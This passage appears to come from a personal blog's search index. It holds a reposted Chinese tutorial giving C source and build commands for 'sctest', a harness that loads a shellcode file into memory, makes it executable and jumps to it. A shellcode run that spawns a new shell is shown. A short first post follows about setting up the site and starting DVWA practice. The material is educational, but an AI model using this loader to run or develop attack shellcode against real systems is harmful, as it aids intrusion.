    <content type="html"><![CDATA[<p>不知不觉，shellcode已成功攻击过程中必不可少的步骤，后面的文章会继续介绍如何编写其它类型的shellcode。直到目前为止，每次完shellcode汇编代码，都需要找到之前（或者重新编写）带缓冲区溢出漏洞的代码进行测试，同时要不停地对准EIP以及esp地址。这对于测试shellcode的正确性来说，很不方便，也难以调试。为此，我们先编写shellcode测试工具，方便后面测试shellcode，所谓磨刀不误砍柴功。</p><p>shellcode测试工具sctest<br>我们将工具取名为sctest，是shell code test的缩写。<br>命令用法：sctest  &lt;shellcode二进制文件&gt;</p><p>该程序的实现很简单：</p><p>1） 读shellcode 二进制读到内存<br>2）将装载shellcode内存的属性变成可执行<br>3）跳到该shellcode执行</p><p>代码如下：</p><pre><code class="c">#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;char code[4096] __attribute__((aligned(4096)));int main(int argc, const char *argv[]){    int fd;    int ret;    void (*func)(void);    if (argc != 2) {    fprintf(stderr, &quot;\n\tUsage: sctest &lt;shellcode&gt;\n\n&quot;);    return 1;    }    fd = open(argv[1], O_RDONLY);    if (!fd) {    fprintf(stderr, &quot;Unable open file %s, err = %d(%m)\n&quot;, argv[1], errno);    return 2;    }    ret = read(fd, code, sizeof(code));    if (ret &lt; 0) {        fprintf(stderr, &quot;Unable read file %s, err = %d(%m)\n&quot;, argv[1], errno);        return 3;    }    ret = mprotect(code, sizeof(code), PROT_EXEC);    if (ret &lt; 0) {        fprintf(stderr, &quot;Unable mprotect, err = %d(%m)\n&quot;, errno);        return 4;    }    /* execute shell code */    func = (void (*)(void))code;    func();    abort();  }</code></pre><p>编译<br>到目前为止，shellcode的运行环境都是32位应用程序，以后涉及64位应用程序；由于同一程序不能混搭32和64位指令，因此需要编译两个工具（32位和64位）</p><p>$ gcc -Wall -g -o sctest32 sctest.c -m32<br>$ gcc -Wall -g -o sctest sctest.c</p><p>测试以前的shellcode</p><p>上篇文章中，介绍如何编写本地shellcode，使用sctest32工具对它进行测试：</p><p>当前 bash的pid</p><p>$ echo $$<br>2180</p><p>测试shellcode<br>ivan@ivan:~/exploit/tools$ ./sctest32 ../shell2</p><p>运行shellcode后sh的pid<br>$ echo $$<br>3178</p><p>两个pid不一样，说明 shell2成功启动了一个新sh</p><p>在后面的shellcode介绍中，我们会使用sctest32/sctest工具进行独立测试，不依赖于漏洞代码。</p><hr><p>版权声明：本文为CSDN博主「海枫」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/linyt/article/details/43538837" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/43538837</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2019/11/19/hello-world/"/>
    <url>/2019/11/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>2019/8/3日 15：22，我的网站算是正式开通了。这里可能是我展现最真实的我的地方，也用来记录我的学习过程和学习资料。在此先感谢一下毛同学的大力鼓吹，让我搞了这个，也感谢我的学校给我报销（笑</p><p>最近在学校的大数据班学习了在centOS搭建hadoop平台（使用java进行程序编写），最开始的是计算和管理都在一个模拟机里的伪分布式，一主一仆的也在回家后在自家电脑上完成了搭建。</p><p>后来为了搞github和gitee备份代码，又去研究了git如何使用，以及在vscode里同步代码，现在也是可以啦~点这可以看 相关代码和操作</p><p>为了在学校更好的敲代码（装逼），也是打算买一个豆子峡谷，装上黑苹果和centOS，平时用黑苹果和我的surface，计算时就用centOS。不得不说i58259U这东西好像挺强的，2/3个8700k，对比i7 8559u差距也不大。</p><p>今天也开始了DVWA的学习，学习使用kali，（虽然今早也没搞多少。。好像就搞了个Brup Force，连Brup Suite的爆破也没完全弄懂咋搞。。</p><p>就先这样吧。还有很多很多没搞懂，但最首先的先享受一下我最后的十来天暑假吧!</p><p>更新：11/19 使用hexo并部署到了github上，打算使用自己的云服务器做加速= =</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
